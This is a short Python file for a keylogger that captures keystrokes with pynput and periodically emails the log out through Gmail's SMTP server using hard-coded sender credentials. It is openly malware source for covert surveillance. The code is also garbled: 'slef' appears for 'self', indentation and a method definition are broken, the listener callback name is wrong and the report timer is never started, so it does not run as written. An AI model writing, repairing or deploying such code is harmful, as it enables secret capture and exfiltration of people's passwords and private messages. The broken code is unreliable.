#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib


class keylogger:
    def__init__(self,wait_time, email, passwd):
        self.log= "keylogger in porcess"
        self.waittime = wait_time
        self.email = email
        self.passwd = passwd
    
    def append_to_log(self,string):
        slef.log = self.log + string

    def porcess_key_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
            slef.append_to_log(current_key)
    
    def report(self):
        self.send_mail(self, self.email, slef.passwd, "\n\n" + slef.log)
        slef.log = ""
        timer = threading.Timer(slef.waittime, self.report)

    def send_mail(self, email, passwd, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,passwd)
    server.sendmail(email,email,msg)
    server.quit()

    def start(slef):
        keyboard_listener = pynput.keyboard.Listener(on_process=slef.porcess_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


